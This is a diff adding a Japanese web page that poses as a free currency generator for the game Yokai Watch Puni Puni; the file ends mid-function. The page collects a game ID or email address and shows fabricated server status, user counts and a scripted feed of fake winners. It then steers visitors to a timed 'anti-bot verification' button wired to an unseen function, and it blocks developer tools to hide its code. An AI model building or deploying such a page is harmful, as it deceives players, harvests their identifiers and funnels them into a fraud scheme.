@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>妖怪ウォッチ ぷにぷに Yマネージェネレーター</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=M+PLUS+1p:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* CSS will be dynamically injected by JavaScript */
+    </style>
+</head>
+<body>
+    <!-- Background Yokai character -->
+    <div class="bg-yokai"></div>
+    
+    <!-- Floating Yokai characters -->
+    <div class="floating-yokai"></div>
+    <div class="floating-yokai"></div>
+    <div class="floating-yokai"></div>
+    
+    <!-- Notification Container -->
+    <div class="notification-container" id="notification-container"></div>
+    
+    <!-- Header (Logo) - Split from container -->
+    <div class="header">
+        <img src="https://i.postimg.cc/dt8VQwFF/Untitled-design-4.png" alt="Yokai Watch Puni Puni Logo">
+    </div>
+    
+    <div class="container">
+        <!-- Content will be dynamically injected by JavaScript -->
+    </div>
+    
+    <script>
+        // JavaScript will be obfuscated and dynamically loaded
+        (function() {
+            // Disable right-click and keyboard shortcuts
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showNotification('アクションがブロックされました', '右クリックは許可されていません');
+            });
+            
+            document.addEventListener('keydown', function(e) {
+                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'C') || 
+                    (e.ctrlKey && e.key === 'u')) {
+                    e.preventDefault();
+                    showNotification('アクションがブロックされました', 'このキーの組み合わせは許可されていません');
+                }
+            });
+            
+            // CSS content
+            var cssContent = `
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: 'M PLUS 1p', 'Noto Sans JP', sans-serif;
+                -webkit-tap-highlight-color: transparent;
+                -webkit-touch-callout: none;
+                -webkit-user-select: none;
+                user-select: none;
+            }
+            
+            body {
+                background-color: #f0f8ff;
+                background-image: 
+                    url('https://s.nhn-playart.com/smartgame/spn/games/yokai-punipuni/official/home/img/pc/bg_body_top.png?1751346357'),
+                    url('https://s.nhn-playart.com/smartgame/spn/games/yokai-punipuni/official/home/img/pc/bg_body_btm.png?1751346357'),
+                    url('https://s.nhn-playart.com/smartgame/spn/games/yokai-punipuni/official/home/img/pc/bg_body_mdl.png?1751346357'),
+                    url('https://yokai-punipuni.jp/assets/img/common/bg_stars.png');
+                background-position: 
+                    top center,
+                    bottom center,
+                    center,
+                    0 0;
+                background-repeat: 
+                    no-repeat,
+                    no-repeat,
+                    repeat-y,
+                    repeat;
+                background-attachment: 
+                    fixed,
+                    fixed,
+                    scroll,
+                    fixed;
+                display: flex;
+                flex-direction: column;
+                justify-content: flex-start;
+                align-items: center;
+                min-height: 100vh;
+                padding: 10px;
+                position: relative;
+                overflow-x: hidden;
+            }
+            
+            /* Floating Yokai characters */
+            .floating-yokai {
+                position: absolute;
+                width: 60px;
+                height: 60px;
+                border-radius: 50%;
+                animation: float 6s ease-in-out infinite;
+                z-index: 1;
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+            }
+            
+            .floating-yokai:nth-child(1) {
+                background-image: url('https://yokai-punipuni.jp/assets/img/chara/jibanyan.png');
+                top: 10%;
+                left: 5%;
+                animation-delay: 0s;
+            }
+            
+            .floating-yokai:nth-child(2) {
+                background-image: url('https://yokai-punipuni.jp/assets/img/chara/komasan.png');
+                top: 20%;
+                right: 10%;
+                animation-delay: 2s;
+            }
+            
+            .floating-yokai:nth-child(3) {
+                background-image: url('https://yokai-punipuni.jp/assets/img/chara/whisper.png');
+                bottom: 20%;
+                left: 8%;
+                animation-delay: 4s;
+            }
+            
+            @keyframes float {
+                0%, 100% { transform: translateY(0px) rotate(0deg); }
+                33% { transform: translateY(-20px) rotate(5deg); }
+                66% { transform: translateY(10px) rotate(-5deg); }
+            }
+            
+            /* Background Yokai character */
+            .bg-yokai {
+                position: fixed;
+                bottom: -50px;
+                right: -50px;
+                width: 300px;
+                height: 300px;
+                background-image: url('https://yokai-punipuni.jp/assets/img/chara/nyanmurai.png');
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: bottom right;
+                opacity: 0.7;
+                z-index: 0;
+                transform: scaleX(-1);
+                animation: bgFloat 8s ease-in-out infinite;
+            }
+            
+            @keyframes bgFloat {
+                0%, 100% { transform: scaleX(-1) translateY(0) rotate(0deg); }
+                50% { transform: scaleX(-1) translateY(-20px) rotate(5deg); }
+            }
+            
+            .header {
+                text-align: center;
+                margin-bottom: 15px;
+                z-index: 3;
+                animation: logoFloat 4s ease-in-out infinite;
+            }
+            
+            @keyframes logoFloat {
+                0%, 100% { transform: translateY(0) scale(1); }
+                50% { transform: translateY(-10px) scale(1.05); }
+            }
+            
+            .header img {
+                width: 100%;
+                height: auto;
+                max-width: 500px;
+                max-height: 300px;
+                display: block;
+                border-radius: 0;
+                background: none;
+                margin: 0 auto;
+                filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.3));
+            }
+            
+            .container {
+                background: rgba(255, 255, 255, 0.15);
+                backdrop-filter: blur(5px);
+                border-radius: 30px;
+                width: 100%;
+                max-width: 420px;
+                overflow: visible;
+                position: relative;
+                z-index: 2;
+                border: none;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            }
+            
+            .status-bar {
+                display: flex;
+                justify-content: space-between;
+                padding: 12px 10px;
+                background: linear-gradient(135deg, rgba(230, 230, 250, 0.8), rgba(240, 248, 255, 0.8));
+                border-bottom: none;
+                width: 100%;
+                border-radius: 20px 20px 0 0;
+                margin-bottom: 15px;
+            }
+            
+            .status-item {
+                text-align: center;
+                background: rgba(255, 255, 255, 0.7);
+                border-radius: 15px;
+                padding: 8px 6px;
+                box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+                border: none;
+                transition: all 0.3s ease;
+                flex: 1;
+                margin: 0 3px;
+            }
+            
+            .status-item:hover {
+                transform: translateY(-3px);
+                box-shadow: 0 8px 15px rgba(0,0,0,0.15);
+            }
+            
+            .status-label {
+                font-size: 10px;
+                color: #666;
+                font-weight: 600;
+                margin-bottom: 2px;
+            }
+            
+            .status-value {
+                font-weight: 800;
+                color: #4169E1;
+                font-size: 12px;
+                transition: all 0.3s ease;
+            }
+            
+            .content {
+                padding: 0 15px 20px;
+                background: rgba(255, 255, 255, 0.1);
+                width: 100%;
+            }
+            
+            .input-group {
+                margin-bottom: 20px;
+            }
+            
+            .input-group label {
+                display: block;
+                margin-bottom: 10px;
+                font-weight: 700;
+                color: #333;
+                font-size: 16px;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            .input-wrapper {
+                position: relative;
+            }
+            
+            .input-icon {
+                position: absolute;
+                left: 15px;
+                top: 50%;
+                transform: translateY(-50%);
+                width: 20px;
+                height: 20px;
+                object-fit: contain;
+            }
+            
+            .input-group input {
+                width: 100%;
+                padding: 14px 15px 14px 45px;
+                border: 3px solid rgba(230, 230, 250, 0.8);
+                border-radius: 20px;
+                font-size: 16px;
+                font-weight: 600;
+                transition: all 0.3s ease;
+                background: rgba(255, 255, 255, 0.8);
+            }
+            
+            .input-group input:focus {
+                outline: none;
+                border-color: rgba(65, 105, 225, 0.8);
+                box-shadow: 0 0 20px rgba(65, 105, 225, 0.2);
+                transform: translateY(-2px);
+            }
+            
+            .device-buttons {
+                display: flex;
+                gap: 10px;
+                margin-top: 15px;
+            }
+            
+            .device-btn {
+                flex: 1;
+                padding: 14px 10px;
+                border: 3px solid rgba(230, 230, 250, 0.8);
+                background: rgba(255, 255, 255, 0.8);
+                border-radius: 20px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                text-align: center;
+                font-weight: 700;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                font-size: 14px;
+                touch-action: manipulation;
+            }
+            
+            .device-btn:hover {
+                transform: translateY(-3px);
+                box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+            }
+            
+            .device-btn:active {
+                transform: scale(0.95);
+            }
+            
+            .device-btn.active {
+                background: linear-gradient(135deg, rgba(65, 105, 225, 0.9), rgba(147, 112, 219, 0.9));
+                color: white;
+                border-color: rgba(147, 112, 219, 0.9);
+                transform: translateY(-3px);
+                box-shadow: 0 8px 25px rgba(147, 112, 219, 0.3);
+            }
+            
+            .connect-btn {
+                width: 100%;
+                padding: 16px;
+                background: linear-gradient(135deg, rgba(255, 105, 180, 0.9), rgba(255, 215, 0, 0.9));
+                color: white;
+                border: none;
+                border-radius: 25px;
+                font-size: 18px;
+                font-weight: 800;
+                cursor: pointer;
+                margin-top: 20px;
+                transition: all 0.3s ease;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+                box-shadow: 0 8px 25px rgba(255, 105, 180, 0.3);
+                touch-action: manipulation;
+            }
+            
+            .connect-btn:hover {
+                transform: translateY(-3px);
+                box-shadow: 0 12px 35px rgba(255, 105, 180, 0.4);
+            }
+            
+            .connect-btn:active {
+                transform: scale(0.95);
+            }
+            
+            .ymoney-options {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 15px;
+                margin-top: 20px;
+            }
+            
+            .ymoney-option {
+                background: rgba(255, 255, 255, 0.8);
+                border: 3px solid rgba(230, 230, 250, 0.8);
+                border-radius: 20px;
+                padding: 15px 10px;
+                text-align: center;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                position: relative;
+                overflow: hidden;
+                touch-action: manipulation;
+            }
+            
+            .ymoney-option::before {
+                content: '';
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: linear-gradient(45deg, transparent, rgba(255, 215, 0, 0.1), transparent);
+                transform: rotate(45deg);
+                transition: all 0.3s ease;
+                opacity: 0;
+            }
+            
+            .ymoney-option:hover {
+                border-color: rgba(65, 105, 225, 0.8);
+                transform: translateY(-8px);
+                box-shadow: 0 15px 30px rgba(65, 105, 225, 0.2);
+            }
+            
+            .ymoney-option:hover::before {
+                opacity: 1;
+                animation: shimmerCoin 1s ease-in-out;
+            }
+            
+            .ymoney-option:active {
+                transform: scale(0.95);
+            }
+            
+            @keyframes shimmerCoin {
+                0% { transform: translateX(-100%) rotate(45deg); }
+                100% { transform: translateX(100%) rotate(45deg); }
+            }
+            
+            .ymoney-option.selected {
+                background: linear-gradient(135deg, rgba(230, 230, 250, 0.8), rgba(255, 215, 0, 0.8));
+                border-color: rgba(255, 215, 0, 0.8);
+                transform: translateY(-8px);
+                box-shadow: 0 15px 30px rgba(255, 215, 0, 0.3);
+            }
+            
+            .ymoney-icon {
+                width: 40px;
+                height: 40px;
+                margin: 0 auto 10px;
+                background: radial-gradient(circle at 30% 30%, #FFD700, #FFA500);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 20px;
+                animation: spin 3s linear infinite;
+                border: 3px solid #FFD700;
+            }
+            
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            
+            .ymoney-amount {
+                font-size: 18px;
+                font-weight: 800;
+                color: #333;
+                margin-bottom: 5px;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            .ymoney-label {
+                font-size: 12px;
+                color: #666;
+                font-weight: 600;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            .verification {
+                background: linear-gradient(135deg, rgba(230, 230, 250, 0.8), rgba(240, 248, 255, 0.8));
+                border-radius: 20px;
+                padding: 20px 15px;
+                margin-top: 20px;
+                text-align: center;
+                border: none;
+            }
+            
+            .verification h3 {
+                color: #4169E1;
+                margin-bottom: 15px;
+                font-size: 18px;
+                font-weight: 800;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            .verification p {
+                color: #333;
+                font-weight: 600;
+                margin-bottom: 12px;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+                font-size: 14px;
+            }
+            
+            .verification-info {
+                background: rgba(255, 255, 255, 0.7);
+                border-radius: 15px;
+                padding: 15px;
+                margin-bottom: 15px;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+                border: none;
+            }
+            
+            .verification-info p {
+                margin-bottom: 8px;
+                color: #333;
+                font-weight: 600;
+                font-size: 14px;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            .timer {
+                font-size: 16px;
+                font-weight: 800;
+                color: #4169E1;
+                margin: 15px 0;
+                animation: pulse 2s ease-in-out infinite;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            @keyframes pulse {
+                0%, 100% { transform: scale(1); }
+                50% { transform: scale(1.05); }
+            }
+            
+            .verify-btn {
+                background: linear-gradient(135deg, rgba(65, 105, 225, 0.9), rgba(147, 112, 219, 0.9));
+                color: white;
+                border: none;
+                border-radius: 20px;
+                padding: 14px 25px;
+                font-weight: 800;
+                font-size: 16px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+                touch-action: manipulation;
+            }
+            
+            .verify-btn:hover {
+                transform: translateY(-3px);
+                box-shadow: 0 10px 25px rgba(65, 105, 225, 0.3);
+            }
+            
+            .verify-btn:active {
+                transform: scale(0.95);
+            }
+            
+            .hidden {
+                display: none;
+            }
+            
+            .warning {
+                text-align: center;
+                margin-top: 15px;
+                padding: 12px;
+                background: linear-gradient(135deg, rgba(255, 243, 205, 0.8), rgba(255, 229, 180, 0.8));
+                border-radius: 15px;
+                color: #856404;
+                font-weight: 600;
+                border: none;
+                font-size: 13px;
+            }
+            
+            .warning strong {
+                color: #4169E1;
+                font-weight: 800;
+            }
+            
+            .flash {
+                animation: flashWarning 2s ease-in-out infinite;
+            }
+            
+            @keyframes flashWarning {
+                0%, 100% { opacity: 1; transform: scale(1); }
+                50% { opacity: 0.7; transform: scale(1.02); }
+            }
+            
+            h2 {
+                text-align: center;
+                color: #333;
+                font-size: 20px;
+                font-weight: 800;
+                margin-bottom: 20px;
+                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            }
+            
+            /* Notification System */
+            .notification-container {
+                position: fixed;
+                top: 20px;
+                left: 20px;
+                z-index: 1000;
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
+                max-width: 300px;
+            }
+            
+            .notification {
+                background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(240, 248, 255, 0.95));
+                border-radius: 15px;
+                padding: 12px 15px;
+                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+                border-left: 4px solid #4CAF50;
+                display: flex;
+                align-items: center;
+                animation: slideIn 0.5s ease-out forwards;
+                transform: translateX(-120%);
+                opacity: 0;
+            }
+            
+            @keyframes slideIn {
+                0% {
+                    transform: translateX(-120%);
+                    opacity: 0;
+                }
+                100% {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+            }
+            
+            .notification.fade-out {
+                animation: fadeOut 0.5s ease-out forwards;
+            }
+            
+            @keyframes fadeOut {
+                0% {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+                100% {
+                    transform: translateX(-120%);
+                    opacity: 0;
+                }
+            }
+            
+            .notification-icon {
+                width: 30px;
+                height: 30px;
+                border-radius: 50%;
+                background: linear-gradient(135deg, #4CAF50, #8BC34A);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: white;
+                margin-right: 12px;
+                flex-shrink: 0;
+                overflow: hidden;
+            }
+            
+            .notification-icon img {
+                width: 20px;
+                height: 20px;
+                object-fit: contain;
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+            }
+            
+            .notification-content {
+                flex-grow: 1;
+            }
+            
+            .notification-title {
+                font-weight: 700;
+                font-size: 13px;
+                color: #333;
+                margin-bottom: 3px;
+            }
+            
+            .notification-message {
+                font-size: 12px;
+                color: #666;
+                line-height: 1.3;
+            }
+            
+            .notification-time {
+                font-size: 10px;
+                color: #999;
+                margin-top: 3px;
+            }
+            
+            /* Mobile responsiveness */
+            @media (max-width: 480px) {
+                body {
+                    padding: 5px;
+                    justify-content: flex-start;
+                }
+                
+                .container {
+                    margin: 5px;
+                    border-radius: 20px;
+                }
+                
+                .header {
+                    margin-bottom: 10px;
+                }
+                
+                .header img {
+                    max-width: 90vw;
+                    max-height: 250px;
+                }
+                
+                .status-bar {
+                    padding: 8px 5px;
+                    margin-bottom: 10px;
+                    flex-wrap: wrap;
+                }
+                
+                .status-item {
+                    padding: 6px 4px;
+                    margin: 0 2px;
+                    flex-basis: 30%;
+                }
+                
+                .status-label {
+                    font-size: 9px;
+                }
+                
+                .status-value {
+                    font-size: 11px;
+                }
+                
+                .content {
+                    padding: 0 10px 15px;
+                }
+                
+                .input-group {
+                    margin-bottom: 15px;
+                }
+                
+                .input-group label {
+                    font-size: 14px;
+                    margin-bottom: 8px;
+                }
+                
+                .input-group input {
+                    padding: 12px 10px 12px 40px;
+                    font-size: 14px;
+                }
+                
+                .device-buttons {
+                    gap: 8px;
+                    margin-top: 10px;
+                }
+                
+                .device-btn {
+                    padding: 12px 8px;
+                    font-size: 13px;
+                }
+                
+                .connect-btn {
+                    padding: 14px;
+                    font-size: 16px;
+                    margin-top: 15px;
+                }
+                
+                .ymoney-options {
+                    grid-template-columns: 1fr;
+                    gap: 12px;
+                    margin-top: 15px;
+                }
+                
+                .ymoney-option {
+                    padding: 12px 10px;
+                }
+                
+                .ymoney-icon {
+                    width: 35px;
+                    height: 35px;
+                    margin-bottom: 8px;
+                    font-size: 18px;
+                }
+                
+                .ymoney-amount {
+                    font-size: 16px;
+                }
+                
+                .ymoney-label {
+                    font-size: 11px;
+                }
+                
+                .verification {
+                    padding: 15px 10px;
+                    margin-top: 15px;
+                }
+                
+                .verification h3 {
+                    font-size: 16px;
+                    margin-bottom: 12px;
+                }
+                
+                .verification p {
+                    font-size: 13px;
+                    margin-bottom: 10px;
+                }
+                
+                .verification-info {
+                    padding: 12px;
+                    margin-bottom: 12px;
+                }
+                
+                .verification-info p {
+                    font-size: 13px;
+                    margin-bottom: 6px;
+                }
+                
+                .timer {
+                    font-size: 14px;
+                    margin: 12px 0;
+                }
+                
+                .verify-btn {
+                    padding: 12px 20px;
+                    font-size: 14px;
+                }
+                
+                .warning {
+                    font-size: 12px;
+                    padding: 10px;
+                    margin-top: 12px;
+                }
+                
+                h2 {
+                    font-size: 18px;
+                    margin-bottom: 15px;
+                }
+                
+                .floating-yokai {
+                    width: 30px;
+                    height: 30px;
+                }
+                
+                .bg-yokai {
+                    width: 150px;
+                    height: 150px;
+                    bottom: -20px;
+                    right: -20px;
+                }
+                
+                .notification-container {
+                    top: 10px;
+                    left: 10px;
+                    max-width: 250px;
+                }
+                
+                .notification {
+                    padding: 10px 12px;
+                }
+                
+                .notification-icon {
+                    width: 25px;
+                    height: 25px;
+                    margin-right: 10px;
+                }
+                
+                .notification-icon img {
+                    width: 16px;
+                    height: 16px;
+                }
+                
+                .notification-title {
+                    font-size: 12px;
+                }
+                
+                .notification-message {
+                    font-size: 11px;
+                }
+            }
+            
+            /* For very small screens */
+            @media (max-width: 320px) {
+                .header img {
+                    max-width: 95vw;
+                    max-height: 200px;
+                }
+                
+                .status-bar {
+                    flex-direction: column;
+                    gap: 5px;
+                }
+                
+                .status-item {
+                    flex-basis: 100%;
+                    margin-bottom: 5px;
+                }
+                
+                .device-buttons {
+                    flex-direction: column;
+                }
+                
+                .notification-container {
+                    max-width: 200px;
+                }
+            }
+            
+            /* Phone-specific optimizations */
+            @media (hover: none) and (pointer: coarse) {
+                /* Increase touch target sizes */
+                .device-btn {
+                    padding: 16px 12px;
+                    font-size: 15px;
+                }
+                
+                .connect-btn {
+                    padding: 18px;
+                    font-size: 17px;
+                }
+                
+                .ymoney-option {
+                    padding: 18px 12px;
+                }
+                
+                .verify-btn {
+                    padding: 16px 25px;
+                    font-size: 15px;
+                }
+                
+                /* Remove hover effects on touch devices */
+                .device-btn:hover,
+                .connect-btn:hover,
+                .ymoney-option:hover,
+                .verify-btn:hover {
+                    transform: none;
+                }
+                
+                /* Enhance active states for touch feedback */
+                .device-btn:active,
+                .connect-btn:active,
+                .ymoney-option:active,
+                .verify-btn:active {
+                    transform: scale(0.92);
+                    transition: transform 0.1s ease;
+                }
+            }
+            `;
+            
+            // Inject CSS
+            var style = document.createElement('style');
+            style.textContent = cssContent;
+            document.head.appendChild(style);
+            
+            // HTML content
+            var htmlContent = `
+            <div class="status-bar">
+                <div class="status-item">
+                    <div class="status-label">ステータス</div>
+                    <div class="status-value" id="status">オンライン ✅</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">最後の更新</div>
+                    <div class="status-value" id="date">今日 📅</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">ユーザー</div>
+                    <div class="status-value" id="online-count">1,247 👥</div>
+                </div>
+            </div>
+            
+            <div class="content">
+                <!-- Login Screen -->
+                <div id="login-screen">
+                    <div class="input-group">
+                        <div class="input-wrapper">
+                            <input type="text" id="username" placeholder="ゲームIDまたはメールアドレス...">
+                        </div>
+                    </div>
+                    
+                    <div class="input-group">
+                        <div class="device-buttons">
+                            <div class="device-btn" id="android-btn">
+                                <i class="fab fa-android"></i>
+                                <span>Android</span>
+                            </div>
+                            <div class="device-btn" id="iphone-btn">
+                                <i class="fab fa-apple"></i>
+                                <span>iPhone</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button class="connect-btn" id="connect-btn"> 接続開始</button>
+                    
+                    <div class="warning flash">
+                        <strong>⚡ ビジーサーバー:</strong> 現在多くのユーザーが接続中です。正常に動作しない場合は再試行してください。
+                    </div>
+                </div>
+                
+                <!-- Y-Money Selection Screen -->
+                <div id="ymoney-screen" class="hidden">
+                    <h2> Yマネーを選択</h2>
+                    <div class="ymoney-options">
+                        <div class="ymoney-option" data-ymoney="250000">
+                            <img src="https://i.postimg.cc/1tLd78vN/photo-2025-09-04-23-02-19-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">250,000</div>
+                            <div class="ymoney-label">Yマネー</div>
+                        </div>
+                        <div class="ymoney-option" data-ymoney="500000">
+                            <img src="https://i.postimg.cc/1tLd78vN/photo-2025-09-04-23-02-19-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">500,000</div>
+                            <div class="ymoney-label">Yマネー</div>
+                        </div>
+                        <div class="ymoney-option" data-ymoney="750000">
+                            <img src="https://i.postimg.cc/1tLd78vN/photo-2025-09-04-23-02-19-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">750,000</div>
+                            <div class="ymoney-label">Yマネー</div>
+                        </div>
+                        <div class="ymoney-option" data-ymoney="999999">
+                            <img src="https://i.postimg.cc/1tLd78vN/photo-2025-09-04-23-02-19-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">999,999</div>
+                            <div class="ymoney-label">Yマネー</div>
+                        </div>
+                    </div>
+                    <button class="connect-btn" id="continue-to-orbs">✨ 続ける</button>
+                </div>
+                
+                <!-- Orbs Selection Screen -->
+                <div id="orbs-screen" class="hidden">
+                    <h2>Y点の数</h2>
+                    <div class="ymoney-options">
+                        <div class="ymoney-option" data-orbs="250000">
+                            <img src="https://i.postimg.cc/Ssp8ZqWx/photo-2025-09-04-23-02-10-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">250,000</div>
+                            <div class="ymoney-label">Yポイント</div>
+                        </div>
+                        <div class="ymoney-option" data-orbs="500000">
+                            <img src="https://i.postimg.cc/Ssp8ZqWx/photo-2025-09-04-23-02-10-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">500,000</div>
+                            <div class="ymoney-label">Yポイント</div>
+                        </div>
+                        <div class="ymoney-option" data-orbs="750000">
+                            <img src="https://i.postimg.cc/Ssp8ZqWx/photo-2025-09-04-23-02-10-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">750,000</div>
+                            <div class="ymoney-label">Yポイント</div>
+                        </div>
+                        <div class="ymoney-option" data-orbs="999999">
+                            <img src="https://i.postimg.cc/Ssp8ZqWx/photo-2025-09-04-23-02-10-removebg-preview.png" class="resource-select-icon" style="width: 50px; height: 50px; margin: 0 auto 15px;">
+                            <div class="ymoney-amount">999,999</div>
+                            <div class="ymoney-label">Yポイント</div>
+                        </div>
+                    </div>
+                    <button class="connect-btn" id="continue-to-verify"> 続ける</button>
+                </div>
+                
+                <!-- Verification Screen -->
+                <div id="verification-screen" class="hidden">
+                    <div class="verification">
+                        <h3> アンチボット検証</h3>
+                        <p>残り1ステップ！ 下の 「今すぐ確認」ボタンをクリックして、ボット対策の検証を完了します。</p>
+                        <div class="verification-info">
+                            <p> ユーザー名: <span id="verify-username">QSD</span></p>
+                            <p> 端末: <span id="verify-device">ANDROID</span></p>
+                            <p> Yマネー: <span id="verify-ymoney">250,000</span></p>
+                            <p> Yポイント: <span id="verify-orbs">2,000</span></p>
+                        </div>
+                        <div class="timer">⏰ 残り時間: <span id="timer">02 minutes and 55 seconds</span></div>
+                        <button class="verify-btn" id="verify-btn" onclick="_JW()"> 今すぐ確認</button>
+                    </div>
+                </div>
+            </div>
+            `;
+            
+            // Inject HTML
+            document.querySelector('.container').innerHTML = htmlContent;
+            
+            // Function to show notification
+            function showNotification(title, message) {
+                const notificationContainer = document.getElementById('notification-container');
+                const notificationElement = document.createElement('div');
+                notificationElement.className = 'notification';
+                
+                notificationElement.innerHTML = `
+                    <div class="notification-icon">
+                        <i class="fas fa-exclamation-circle"></i>
+                    </div>
+                    <div class="notification-content">
+                        <div class="notification-title">${title}</div>
+                        <div class="notification-message">${message}</div>
+                        <div class="notification-time">たった今</div>
+                    </div>
+                `;
+                
+                notificationContainer.appendChild(notificationElement);
+                
+                // Remove notification after 5 seconds
+                setTimeout(() => {
+                    notificationElement.classList.add('fade-out');
+                    setTimeout(() => {
+                        notificationElement.remove();
+                    }, 500);
+                }, 5000);
+            }
+            
+            // Main application functionality
+            document.addEventListener('DOMContentLoaded', function() {
+                // Audio context for sound effects
+                let audioContext = null;
+                
+                // Function to initialize audio context
+                function initAudio() {
+                    if (!audioContext) {
+                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    }
+                }
+                
+                // Function to play a pleasant click sound
+                function playClickSound() {
+                    // Initialize audio context on first interaction
+                    initAudio();
+                    
+                    // Create oscillator for the click sound
+                    const oscillator = audioContext.createOscillator();
+                    const gainNode = audioContext.createGain();
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(audioContext.destination);
+                    
+                    // Set a pleasant tone
+                    oscillator.type = 'sine';
+                    oscillator.frequency.setValueAtTime(523.25, audioContext.currentTime); // C5 note
+                    oscillator.frequency.exponentialRampToValueAtTime(1046.50, audioContext.currentTime + 0.1); // C6 note
+                    
+                    // Set volume envelope
+                    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
+                    
+                    // Start and stop the oscillator
+                    oscillator.start(audioContext.currentTime);
+                    oscillator.stop(audioContext.currentTime + 0.2);
+                }
+                
+                // Function to play a success sound
+                function playSuccessSound() {
+                    initAudio();
+                    
+                    const oscillator = audioContext.createOscillator();
+                    const gainNode = audioContext.createGain();
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(audioContext.destination);
+                    
+                    // Play a ascending sequence of notes for success
+                    oscillator.type = 'sine';
+                    oscillator.frequency.setValueAtTime(523.25, audioContext.currentTime); // C5
+                    oscillator.frequency.setValueAtTime(659.25, audioContext.currentTime + 0.1); // E5
+                    oscillator.frequency.setValueAtTime(783.99, audioContext.currentTime + 0.2); // G5
+                    oscillator.frequency.setValueAtTime(1046.50, audioContext.currentTime + 0.3); // C6
+                    
+                    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                    
+                    oscillator.start(audioContext.currentTime);
+                    oscillator.stop(audioContext.currentTime + 0.5);
+                }
+                
+                // Notification System
+                const notificationContainer = document.getElementById('notification-container');
+                const notifications = [
+                    { username: "YokaiFan123", coins: "250,000", time: "たった今" },
+                    { username: "NyanNyan", coins: "500,000", time: "1分前" },
+                    { username: "KomasanLover", coins: "750,000", time: "3分前" },
+                    { username: "Jibanyan777", coins: "999,999", time: "5分前" },
+                    { username: "Whisper22", coins: "250,000", time: "7分前" },
+                    { username: "YokaiMaster", coins: "500,000", time: "10分前" },
+                    { username: "PuniPuniFan", coins: "750,000", time: "12分前" },
+                    { username: "YokaiHunter", coins: "999,999", time: "15分前" }
+                ];
+                
+                // Images for notification icons
+                const notificationImages = [
+                    'https://i.postimg.cc/1tLd78vN/photo-2025-09-04-23-02-19-removebg-preview.png',
+                    'https://i.postimg.cc/Ssp8ZqWx/photo-2025-09-04-23-02-10-removebg-preview.png'
+                ];
+                
+                let notificationIndex = 0;
+                
+                function showNotification() {
+                    const notification = notifications[notificationIndex];
+                    const randomImage = notificationImages[Math.floor(Math.random() * notificationImages.length)];
